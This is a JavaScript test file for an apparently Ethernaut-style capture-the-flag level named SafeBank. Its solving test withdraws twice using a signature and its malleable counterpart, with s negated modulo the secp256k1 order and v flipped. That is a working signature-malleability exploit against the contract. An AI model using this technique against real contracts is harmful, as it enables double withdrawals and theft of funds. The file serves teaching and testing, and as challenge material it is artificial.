const SafeBankFactory = artifacts.require('SafeBankFactory')
const SafeBank = artifacts.require('SafeBank')


//const SafeBankAttack = artifacts.require('./attacks/SafeBankAttack.sol')

const Ethernaut = artifacts.require('./Ethernaut.sol')

const { soliditySha3 } = require("web3-utils");

import * as utils from '../utils/TestUtils'
import BigNumber from 'bignumber.js';
import { keccak256 } from 'web3-utils';
const { expectRevert } = require('@openzeppelin/test-helpers');
const truffleAssert = require('truffle-assertions');

const secp256k1 = require('secp256k1')

var EthUtil             = require('ethereumjs-util');


contract('SafeBank', function(accounts) {

    let ethernaut;
    let level;
    let owner = accounts[0];
    let player = accounts[1];

    before(async function() {
        ethernaut = await Ethernaut.new();
        level = await SafeBankFactory.new()
        await ethernaut.registerLevel(level.address)
    });

    it('should fail if the player did not solve the level', async function() {
        const instance = await utils.createLevelInstance(ethernaut, level.address, player, SafeBank, {value: web3.utils.toWei("1", "ether"), from:player})

        await truffleAssert.reverts(instance.winChall())

        const completed = await utils.submitLevelInstance(
            ethernaut,
            level.address,
            instance.address,
            player
        )

        assert.isFalse(completed)
    });

    

    it('should allow the player to solve the level', async function() {
        const instance = await utils.createLevelInstance(ethernaut, level.address, player, SafeBank, {value: web3.utils.toWei("1", "ether"), from:player})

        
        const balance = await  web3.eth.getBalance(instance.address)
        assert.isTrue(balance == web3.utils.toWei("1", "ether"))

        await instance.deposit({value: web3.utils.toWei("1", "ether"), from:player})

        const nonce = await instance.nonce()
        const h = await instance.get_hash(player, web3.utils.toWei("1", "ether"), nonce)
        
        const signature = await web3.eth.sign(h, player) 

        const r = signature.substr(0, 66)
        const s = new BigNumber('0x' + signature.substr(66, 64))
        const v = '0x' + (parseInt(signature.substr(130, 2))+27).toString(16)
        const vv = '0x' + (parseInt(signature.substr(130, 2))+28).toString(16)

        // EDCSA curve
        
        const n  = new BigNumber('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141')

        // Use same modulo as in python
        BigNumber.config({ MODULO_MODE: BigNumber.ROUND_FLOOR })
        const ss = (new BigNumber(0)).sub(s).modulo(n)

        await instance.withdraw(h,
            r,
            '0x'+s.toString(16),
            v,
            {from:player})

            
        await instance.withdraw(h,
            r,
            '0x'+ss.toString(16),
            vv,
            {from:player})

        await instance.winChall()

        const completed = await utils.submitLevelInstance(
            ethernaut,
            level.address,
            instance.address,
            player
        )

        assert.isTrue(completed)
    });

});
